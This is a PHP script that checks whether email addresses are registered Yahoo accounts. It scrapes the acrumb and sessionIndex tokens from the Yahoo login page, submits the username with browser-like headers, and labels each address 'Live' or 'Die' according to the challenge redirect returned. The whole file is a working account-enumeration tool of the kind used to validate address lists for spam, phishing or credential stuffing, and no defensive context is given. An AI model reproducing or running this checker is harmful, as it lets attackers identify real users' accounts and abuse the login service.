$email = urlencode($_GET['email']);
ini_set("memory_limit",-1);
set_time_limit(0);
date_default_timezone_set("Asia/Jakarta");

require_once("RollingCurl/curl.php");

$yahoo = new curl();
$yahoo->cookies("su.txt");
$url = "https://login.yahoo.com/?src=ym&.done=https://mail.yahoo.com/&add=1&done=https://mail.yahoo.com/";
$page = $yahoo->get($url);
$acrumb = fetch_value($page,'name="acrumb" value="','"');
$sessionIndex = fetch_value($page,'name="sessionIndex" value="','"');

$headers = array();
$headers[] = 'Connection: keep-alive';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Accept: */*';
$headers[] = 'Origin: https://login.yahoo.com';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Referer: https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com';
$headers[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
$yahoo->header($headers);
$data = "acrumb=$acrumb&sessionIndex=$sessionIndex&username=$email&passwd=&signin=Berikutnya";
$page1 = $yahoo->post($url,$data);
if (strpos($page1,'ERROR_INVALID_USERNAME')){
	echo "Die\n";	
}
elseif (strpos($page1,'https://login.yahoo.com/account/challenge/fail?')){
	echo "Die\n";	
}
elseif (strpos($page1,'https://login.yahoo.com/account/challenge/password')){
	echo "Live\n";	
}
elseif (strpos($page1,'https://login.yahoo.com/account/challenge/phone-verify?')){
	echo "Live\n";	
}
elseif (strpos($page1,'https://login.yahoo.com/account/challenge/recaptcha')){
	echo "Live\n";	
}
elseif (strpos($page1,'https://login.yahoo.com/saml2')){
	echo "Live\n";	
}
elseif (strpos($page1,'https://login.yahoo.com/account/challenge/push?')){
	echo "Live\n";	
}
elseif (strpos($page1,'https://login.yahoo.com/account/challenge/yak-code')){
	echo "Live\n";	
}
elseif (strpos($page1,'https://loginprodx.att.net/FIM/sps/ATTidp/saml20/logininitial?')){
	echo "Live\n";	
}
elseif (strpos($page1,'https://login.yahoo.com/account/challenge/challenge-selector?')){
	echo "Live\n";	
}
elseif (strpos($page1,'https://login.yahoo.com/account/challenge/phone-obfuscation?')){
	echo "Live\n";	
}
else{
	echo "$email -- $page1\n";
}
